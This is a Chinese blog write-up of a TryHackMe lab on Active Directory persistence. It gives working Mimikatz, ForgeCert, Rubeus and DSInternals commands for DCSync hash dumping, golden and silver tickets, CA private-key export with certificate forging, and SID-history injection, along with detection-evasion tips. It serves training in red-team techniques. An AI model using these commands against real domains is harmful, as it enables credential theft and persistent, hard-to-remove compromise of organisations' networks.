<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe房间之Persisting Active Directory | deCOLE's Blog</title><meta name="author" content="deCOLE"><meta name="copyright" content="deCOLE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="TryHackMe房间之Persisting Active Directory">
<meta property="og:type" content="article">
<meta property="og:title" content="TryHackMe房间之Persisting Active Directory">
<meta property="og:url" content="http://example.com/2025/05/27/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BPersisting%20Active%20Directory/index.html">
<meta property="og:site_name" content="deCOLE&#39;s Blog">
<meta property="og:description" content="TryHackMe房间之Persisting Active Directory">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/touxiang.jpg">
<meta property="article:published_time" content="2025-05-26T16:00:00.000Z">
<meta property="article:modified_time" content="2025-05-27T07:35:13.446Z">
<meta property="article:author" content="deCOLE">
<meta property="article:tag" content="TryHackMe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/touxiang.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "TryHackMe房间之Persisting Active Directory",
  "url": "http://example.com/2025/05/27/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BPersisting%20Active%20Directory/",
  "image": "http://example.com/img/touxiang.jpg",
  "datePublished": "2025-05-26T16:00:00.000Z",
  "dateModified": "2025-05-27T07:35:13.446Z",
  "author": [
    {
      "@type": "Person",
      "name": "deCOLE",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/touxiang.jpg"><link rel="canonical" href="http://example.com/2025/05/27/TryHackMe%E6%88%BF%E9%97%B4%E4%B9%8BPersisting%20Active%20Directory/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'TryHackMe房间之Persisting Active Directory',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(img/qccq.jpg);"></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">deCOLE's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">TryHackMe房间之Persisting Active Directory</span></a></span><div id="menus"></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe房间之Persisting Active Directory</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-26T16:00:00.000Z" title="发表于 2025-05-27 00:00:00">2025-05-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-27T07:35:13.446Z" title="更新于 2025-05-27 15:35:13">2025-05-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h1 id="TryHackMe房间之Persisting-Active-Directory"><a href="#TryHackMe房间之Persisting-Active-Directory" class="headerlink" title="TryHackMe房间之Persisting Active Directory"></a>TryHackMe房间之Persisting Active Directory</h1><h1 id="通过凭据进行权限维持"><a href="#通过凭据进行权限维持" class="headerlink" title="通过凭据进行权限维持"></a>通过凭据进行权限维持</h1><p>获得了域管理员凭据后，我们就可以用特权凭据对低权限凭据进行“降维打击”</p>
<p>通过高权限用户凭据来实现对低权限用户的权限维持</p>
<h2 id="DC同步"><a href="#DC同步" class="headerlink" title="DC同步"></a>DC同步</h2><p>大型组织中，每个域只有一个域控是不够的，一般会采用多个域控来提高身份验证服务的效率</p>
<p>于是，如何在两个不同的办公室使用相同的凭据进行身份验证成为了一个问题</p>
<p>这里涉及到一个<strong>域复制</strong>的知识点</p>
<p>每个域控都运行着一个叫做<strong>KCC</strong>的进程，也就是<strong>知识一致性检查器（Knowledge Consistency Checker）</strong></p>
<p>KCC的作用就是：<strong>为<strong><strong>AD</strong></strong>林生成复制拓扑</strong>，并且通过<strong>RPC</strong>**（**<strong>远程过程调用</strong>）自动连接到其他域控，以此同步信息</p>
<p>这也就解释了之前我们在上一个Exploiting AD房间里，更改密码后需要等待几分钟才能进行身份验证，这是因为负责更改密码的域控和我们进行身份验证的域控不是同一个</p>
<p>复制过程称为 DC 同步。不仅仅是 DC 可以启动复制。属于 Domain Admins 组的帐户也可以出于合法目的（例如创建新的域控制器）执行此操作</p>
<p>如果我们有权限访问具有<strong>域复制权限</strong>的账户，我们就可以发动DC Sync攻击，从DC获取凭证</p>
<p>在红蓝对抗中，蓝队通常会对先特权账户进行检查，并且特权账户一般也是优先被重置的，这就意味着我们权限维持的目标应该转向这些</p>
<ol>
<li><strong>在多台计算机拥有本地<strong><strong>管理员</strong></strong>权限的凭据</strong> 通常，组织有一两个组，对几乎所有计算机都具有本地管理员权限。这些组通常分为一个用于工作站的组和一个用于服务器的组。通过收集这些组成员的凭据，我们仍然可以访问资产中的大多数计算机。</li>
<li><strong>具有委派权限的服务账户</strong> 使用这些账户，我们将能够强制黄金和白银票证执行 Kerberos 委派攻击</li>
<li><strong>用于特权<strong><strong>AD</strong></strong>服务的账户</strong> 如果我们入侵了 Exchange、Windows Server Update Services （WSUS） 或 System Center Configuration Manager （SCCM） 等特权服务的帐户，我们就可以利用 AD 利用再次获得特权立足点。</li>
</ol>
<p>先登个域管理员账号</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh za\\Administrator@thmwrk1.za.tryhackme.loc</span><br></pre></td></tr></table></figure>

<p>现在尝试用Mimikatz来获取凭据</p>
<p>首先是执行我们自己的低权限账户的DC同步</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:za.tryhackme.loc /user:alice.gibson</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271526689.png?raw=true" alt="img"></p>
<p>相当多的输出，包括我们账户当前的NTLM哈希</p>
<p><a target="_blank" rel="noopener" href="https://codebeautify.org/ntlm-hash-generator">https://codebeautify.org/ntlm-hash-generator</a></p>
<p>可以通过这个网站来验证NTLM哈希是否准确</p>
<p>但我们的目标是让域控同步每个账户，并启用Mimikatz的日志记录，以便于我们离线破解密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">log</span> alice.gibson_dcdump.txt</span><br><span class="line">lsadump::dcsync /domain:za.tryhackme.loc /all</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271526667.png?raw=true" alt="img"></p>
<p>完成后，退出 Mimikatz 以完成转储查找的收尾工作，然后你就可以下载 <code>&lt;用户名&gt;_dcdump.txt</code> 文件了。</p>
<p>你可以使用 <code>cat &lt;用户名&gt;_dcdump.txt | grep &quot;SAM Username&quot;</code> 命令来恢复所有的用户名，使用 <code>cat &lt;用户名&gt;_dcdump.txt | grep &quot;Hash NTLM&quot;</code> 命令来获取所有的哈希值。</p>
<p>现在，我们既可以进行离线密码破解攻击以恢复明文凭据，也可以简单地使用 Mimikatz 进行哈希传递攻击</p>
<h1 id="利用Ticket进行权限维持"><a href="#利用Ticket进行权限维持" class="headerlink" title="利用Ticket进行权限维持"></a>利用Ticket进行权限维持</h1><p>简单回顾一下Kerberos认证流程</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271526405.png?raw=true" alt="img"></p>
<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>这一步通常意味着我们绕过了上图的1 2步骤，完成了对域控的身份验证，并且拥有特权账户的TGT</p>
<p>在伪造黄金票据之前，我们需要获得Krbtgt账户的密码哈希，以便于为任何用户签署TGT</p>
<p>需要注意的事项</p>
<ol>
<li>在 Kerberos 流程的这一阶段进行注入时，我们无需获取目标模拟账户的密码哈希，因为这一步已被绕过。TGT 仅用于证明域控制器（DC）上的密钥分发中心（KDC）对其进行了签名。由于 TGT 由 KRBTGT 账户的哈希值签名，因此无论其内容如何，验证都会通过并被认定为有效。</li>
<li>关于 TGT 内容，KDC 仅会验证超过 20 分钟的用户账户信息。这意味着我们可以在 TGT 中植入已禁用、已删除或不存在的账户，只要确保时间戳不超过 20 分钟即可生效。</li>
<li>由于票据策略直接嵌入在 TGT 中，我们可以覆盖 KDC 预设的参数（例如票据有效期为 10 小时）。通过修改时间戳，我们甚至能将 TGT 的有效期延长至 10 年，实现持久化访问。</li>
<li>默认情况下，KRBTGT 账户的密码永不更改。一旦获取该哈希值，除非手动轮换，我们可以持续生成有效 TGT 以维持长期访问权限。</li>
<li>蓝队必须对 KRBTGT 密码进行两次轮换，因为账户会同时保留当前和前一个密码。这种设计旨在防止意外密码轮换导致服务中断</li>
<li>轮换 KRBTGT 密码对蓝队而言是极其痛苦的过程，因为这会导致大量服务停止运行。某些服务仍持有看似有效的 TGT（时间戳未过期），但实际上已失效。由于缺乏自动检测机制，这些服务无法主动请求新 TGT。</li>
<li>黄金票据甚至可以绕过智能卡认证，因为智能卡验证发生在 DC 生成 TGT 之前。我们可以在任何设备（包括未加入域的攻击主机）生成黄金票据，极大增加了蓝队的检测难度。</li>
</ol>
<p>除了 KRBTGT 帐户的密码哈希之外，我们只需要要模拟的人员的域名、域 SID 和用户 ID。<strong>如果我们能够恢复 KRBTGT 帐户的密码哈希值，那么我们已经可以恢复其他所需信息</strong>。</p>
<p>下面简单做个金票</p>
<p>由于在之前的DC同步中已经拿到了krbtgt的哈希，现在我们只需要找Domain SID就好了</p>
<p>切换到我们<strong>非特权用户</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh za\\alice.gibson@thmwrk1.za.tryhackme.loc</span><br></pre></td></tr></table></figure>

<p>用AD-RSAT cmdlet来恢复命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADDomain</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271526534.png?raw=true" alt="img"></p>
<p>然后打开我们的mimikatz</p>
<p>运行指令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:&lt;Domain SID&gt; /krbtgt:&lt;NTLM <span class="built_in">hash</span> of KRBTGT account&gt; /endin:600 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>&#x2F;admin</strong> - 我们要模拟的用户名。这不必是有效用户。</li>
<li><strong>&#x2F;domain</strong> - 我们要为其生成票证的域的 FQDN。</li>
<li><strong>&#x2F;id</strong> - 用户 RID。默认情况下，Mimikatz 使用 RID 500，这是默认的管理员账户 RID。</li>
<li><strong>&#x2F;sid</strong> — 要为其生成票证的域的 SID。</li>
<li><strong>&#x2F;krbtgt</strong> - KRBTGT 帐户的 NTLM 哈希。</li>
<li><strong>&#x2F;endin</strong> - 票证生命周期。默认情况下，Mimikatz 会生成有效期为 10 年的票证。AD 的默认 Kerberos 策略为 10 小时（600 分钟）</li>
<li><strong>&#x2F;renewmax</strong> - 续订后的最长票证生存期。默认情况下，Mimikatz 会生成有效期为 10 年的票证。AD 的默认 Kerberos 策略为 7 天（10080 分钟）</li>
<li><strong>&#x2F;ptt</strong> - 此标志指示 Mimikatz 将票证直接注入会话中，这意味着它已准备好使用。</li>
</ul>
<p>成功后如图</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271526865.png?raw=true" alt="img"></p>
<p>可以尝试通过对域控制器运行 dir 命令来验证黄金票证是否正常工作</p>
<p>这是在模拟高权限用户访问域控的敏感文件，以此验证黄金票据是否生效</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\thmdc.za.tryhackme.loc\c$\</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271527577.png?raw=true" alt="img"></p>
<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>白银票据是伪造的服务票据（TGS tickets）。现在，我们跳过与域控制器上 KDC 的所有通信（如上图步骤 1-4），直接与目标服务进行交互。</p>
<p>关于白银票据的一些关键特性：</p>
<ol>
<li>生成的服务票据（TGS）由目标主机的机器账户签名</li>
<li>黄金票据与白银票据的核心区别在于权限范围： <strong>黄金票据</strong>：通过 KRBTGT 账户哈希，可获取域内所有资源的访问权限 <strong>白银票据</strong>：仅利用目标服务器的机器账户哈希，权限局限于该服务器本身</li>
<li>由于TGS是我们伪造出来的，所以没有关联的TGT，也就意味着我们不与DC交互，攻击行为更隐蔽</li>
<li>因为权限是通过SID确定的，所以我们可以用银票创建不存在的用户，只要保证包含特定安全标识符（如本地管理员组 SID）</li>
<li>计算机账户密码通常三十天轮换一次，不过我们可以利用TGS提供的访问权限来访问主机注册表，更改负责计算机账户密码轮换的参数，从而<strong>确保机器账户保持静态，以此维权</strong></li>
<li>虽然我们只能访问单个主机，但是计算机账户可以用作普通AD账户，可以对AD进行进一步的枚举和利用</li>
</ol>
<p>Mimikatz制作白银票据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:&lt;Domain SID&gt; /target:&lt;Hostname of server being targeted&gt; /rc4:&lt;NTLM Hash of machine account of target&gt; /service:cifs /ptt</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;target - 目标服务器的主机名。此处使用 <code>THMSERVER1.za.tryhackme.loc</code>，但也可以是任何加入域的主机（domain-joined host）。</li>
<li>&#x2F;rc4 - 目标机器账户的 NTLM 哈希值。需通过域控制器同步（DC Sync）结果查找 <code>THMSERVER1$</code> 的 NTLM 哈希（<code>$</code> 符号表示该账户为机器账户）。</li>
<li>&#x2F;service - 请求的服务类型。** 通用互联网文件系统（CIFS）** 是稳妥的选择，因为它支持文件访问功能。</li>
</ul>
<p>流程差不多，不做演示</p>
<h1 id="利用证书进行权限维持"><a href="#利用证书进行权限维持" class="headerlink" title="利用证书进行权限维持"></a>利用证书进行权限维持</h1><blockquote>
<p>从当前阶段开始讨论的技术具有极强的侵入性且难以清除。即使您在红队演习中获得使用这些技术的授权，执行时也必须极度谨慎。在真实场景中，大多数此类技术的利用将导致整个域的重建。请务必充分了解使用这些技术的后果，并仅在评估前获得批准且被认定为必要时才实施。</p>
<p>在多数情况下，红队演习会在此阶段终止而非继续使用这些技术。这意味着您更可能不会实际执行这些持久化操作，而是通过模拟的方式演示其影响。</p>
</blockquote>
<p>如果我们窃取了root CA证书的私钥，即可随时生成我们自己的证书，而由于这些证书不是CA颁发的，蓝队无法对其进行撤销操作，这意味着他们需要轮换整个CA，也就是把所有已签发的证书撤销，才能把我们踢出去</p>
<p>那很坏了！</p>
<h2 id="窃取私钥"><a href="#窃取私钥" class="headerlink" title="窃取私钥"></a>窃取私钥</h2><p>CA 的私钥存储在 CA 服务器本地。如果私钥未通过硬件安全模块（HSM）等硬件级保护方式（许多仅将 Active Directory 证书服务（AD CS）用于内部用途的组织通常如此）进行保护，它将由机器的数据保护 API（DPAPI）进行加密。这意味着我们可以使用 Mimikatz 和 SharpDPAPI 等工具从 CA 服务器提取证书及私钥。</p>
<p>用上管理员账户开个目录，加载Mimikatz</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271527827.png?raw=true" alt="img"></p>
<p>看看是否能查看存储在DC上的证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto::certificates /systemstore:local_machine</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271527488.png?raw=true" alt="img"></p>
<p>注意到</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271527059.png?raw=true" alt="img"></p>
<p>一些证书被设置为不允许我们导出密钥，但是我们生成新证书是需要这些私钥的，刚好Mimikatz允许我们对内存进行修补，以导出这些密钥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># crypto::capi</span></span><br><span class="line">Local CryptoAPI RSA CSP patched</span><br><span class="line">Local CryptoAPI DSS CSP patched</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># crypto::cng</span></span><br><span class="line"><span class="string">&quot;KeyIso&quot;</span> service patched</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271527821.png?raw=true" alt="img"></p>
<p>修复这些服务之后，我们就可以用mimikatz导出证书了</p>
<p>导出的证书将以 PFX 和 DER 格式存储到磁盘</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypto::certificates /systemstore:local_machine /export</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271527166.png?raw=true" alt="img"></p>
<p>查看一下</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271527648.png?raw=true" alt="img"></p>
<p>后缀为pfx的证书是我们所需要的，想要导出私钥，必须用密码对证书进行加密，而在默认情况下Mimikatz导出的证书密码为<strong>mimikatz</strong></p>
<h2 id="生成证书"><a href="#生成证书" class="headerlink" title="生成证书"></a>生成证书</h2><p>有了私钥和root CA证书，我们就可以使用SpectorOps <a target="_blank" rel="noopener" href="https://github.com/GhostPack/ForgeCert">ForgeCert</a> 工具为我们想要的任何用户伪造客户端身份验证证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath local_machine_My_0_.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath deCOLEme.pfx --NewCertPassword deCOLEd</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><strong>CaCertPath -</strong> 我们导出的证书颁发机构（CA）证书的路径</li>
<li><strong>CaCertPassword</strong> - 用于加密证书的密码。默认情况下，Mimikatz 设置的密码为 “mimikatz”</li>
<li><strong>Subject</strong> - 证书的主题或公用名称。就我们使用该证书的目的而言，这实际上并不太重要</li>
<li><strong>SubjectAltName</strong> - 这是我们想要使用此证书来模拟的账户的用户主体名称（UPN）。该用户必须是合法用户</li>
<li><strong>NewCertPath</strong> - ForgeCert 将存储所生成证书的路径</li>
<li><strong>NewCertPassword</strong> - 由于出于身份验证目的，证书需要导出私钥，因此我们必须设置一个用于加密它的新密码</li>
</ul>
<p>可以看到生成了一个证书</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528332.png?raw=true" alt="img"></p>
<p>接着可以用Rubeus尝试请求TGT，以此验证证书是否受信任</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:deCOLEme.pfx /password:deCOLEd /outfile:deCOLEddd /domain:za.tryhackme.loc /dc:10.200.62.101</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li>**&#x2F;user：**指定了我们将模拟的用户，并且该用户必须与我们生成的证书的用户主体名称（UPN）相匹配</li>
<li>**&#x2F;enctype：**这指定了票据的加密类型。设置此选项对于规避检测很重要，因为默认的加密算法较弱，这可能会导致出现 “传递哈希” 警报</li>
<li>**&#x2F;certificate：**我们已生成的证书的路径。</li>
<li>**&#x2F;password：**我们证书文件的密码</li>
<li>**&#x2F;outfile：**我们的票据授予票据（TGT）将输出到的文件</li>
<li>**&#x2F;domain：**我们当前正在攻击的域的完全限定域名（FQDN）</li>
<li>**&#x2F;dc：**我们向其请求票据授予票据（TGT）的域控制器的 IP 地址。通常，最好选择一个运行证书颁发机构（CA）服务的域控制器</li>
</ul>
<p>申请到TGT就可以用mimikatz加载了，不做演示</p>
<h1 id="利用SID历史记录进行权限维持"><a href="#利用SID历史记录进行权限维持" class="headerlink" title="利用SID历史记录进行权限维持"></a>利用SID历史记录进行权限维持</h1><p>SID（安全标识符）用于在连接资源时跟踪安全主体以及账户的访问权限</p>
<p>此外，账户上还有一个属性，叫做SID历史记录。SID历史记录的用处是：允许将一个账户的访问权限有效地克隆到另一个账户上，这一个功能在AD迁移的时候很有帮助，这是因为它允许用户在迁移到新的域时保留对原始域的访问权限。在新的域中，用户将拥有新的SID，但我们能在SID历史记录中添加用户的现有SID，以此实现使用新账户访问以前域中的资源</p>
<p>与之而来的问题是：SID历史记录不局限于仅仅包含来自其他域的安全标识符</p>
<p> 只要有适当的权限，我们就能将当前域的一个安全标识符添加到我们控制的某个账户的SID历史记录中，以此实现权限维持</p>
<p> 需要注意的事：</p>
<ol>
<li>我们需要<strong>域管理员或者同等权限</strong>才能进行这种攻击</li>
<li>当账户创建登录事件的时候，与该账户相关的SID将被添加到用户的令牌中，然后以此确定与该账户相关联的权限，这包含组SID</li>
<li>如果我们注入 Enterprise Admin SID，我们还可以更进一步提升账户权限，成为林中所有域的域管理员</li>
<li>因为SID被添加到用户的令牌中，所以即使该账户实际上并不是组的成员，也会拥有对应的权限。这就意味着我们的账户可以知识一个普通用户账户，其成员身份仅为Domain Users组的成员，我们也可以通过使用这个账户更改另一个账户的SID历史记录，从而神鬼不觉地提权和维权</li>
</ol>
<h2 id="伪造SID历史记录"><a href="#伪造SID历史记录" class="headerlink" title="伪造SID历史记录"></a>伪造SID历史记录</h2><p>在伪造SID历史记录前，我们先获取相关信息，确保我们的低权限用户没有任何SID历史记录信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser &lt;your ad username&gt; -properties sidhistory,memberof</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528952.png?raw=true" alt="img"></p>
<p>可以看到我们的SIDHistory是空的</p>
<p>接下来获取域管理员组 Domain Admins的ID</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADGroup <span class="string">&quot;Domain Admins&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202505271528778.png?raw=true" alt="img"></p>
<p>我们可以使用像 Mimikatz 这样的东西来添加 SID 历史记录。</p>
<p>但是，最新版本的 Mimikatz 存在一个缺陷，不允许它修补 LSASS 以更新 SID 历史记录。</p>
<p>因此，我们需要使用其他东西。在这种情况下，我们将使用 <a target="_blank" rel="noopener" href="https://github.com/MichaelGrafnetter/DSInternals">DSInternals</a> 工具直接修补 ntds.dit 文件，即存储所有信息的 AD 数据库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator.ZA&gt;Stop-Service -Name ntds -force </span><br><span class="line">PS C:\Users\Administrator.ZA&gt; Add-ADDBSidHistory -SamAccountName <span class="string">&#x27;username of our low-priveleged AD account&#x27;</span> -SidHistory <span class="string">&#x27;SID to add to SID History&#x27;</span> -DatabasePath C:\Windows\NTDS\ntds.dit </span><br><span class="line">PS C:\Users\Administrator.ZA&gt;Start-Service -Name ntds </span><br></pre></td></tr></table></figure>

<p>当 NTDS 服务运行时，NTDS 数据库将被锁定。为了修补我们的 SID 历史记录，我们必须首先停止该服务。 <strong>修补后必须重新启动 NTDS 服务，否则，整个网络的身份验证将不再有效。</strong></p>
<p>下面这些部分由于都不涉及自己实操，就粘上来看看得了</p>
<h1 id="通过组成员身份进行权限维持"><a href="#通过组成员身份进行权限维持" class="headerlink" title="通过组成员身份进行权限维持"></a>通过组成员身份进行权限维持</h1><p>如任务 1 中所述，最高权限的帐户或组并不总是用于持久性的最佳选择。与其他组相比，特权组受到更密切的监控。任何被归类为受保护组的组（例如域管理员或企业管理员）都会受到额外的安全审查。因此，如果我们想通过组成员身份保持持久性，我们可能需要在将自己的帐户添加到的组中发挥创意：</p>
<ul>
<li>IT 支持组可用于获取特权，例如强制更改用户密码。尽管在大多数情况下，我们无法重置特权用户的密码，但即使拥有重置低特权用户的能力，我们也可以将其传播到工作站。</li>
<li>提供本地管理员权限的组通常不像受保护的组那样受到严密监控。通过网络支持组的组成员身份获得正确主机的本地管理员权限，我们可能具有良好的持久性，可用于再次入侵域。</li>
<li>这并不总是与直接特权有关。有时，拥有间接特权（例如对组策略对象 (GPO) 的所有权）的组也可以很好地实现持久性。</li>
</ul>
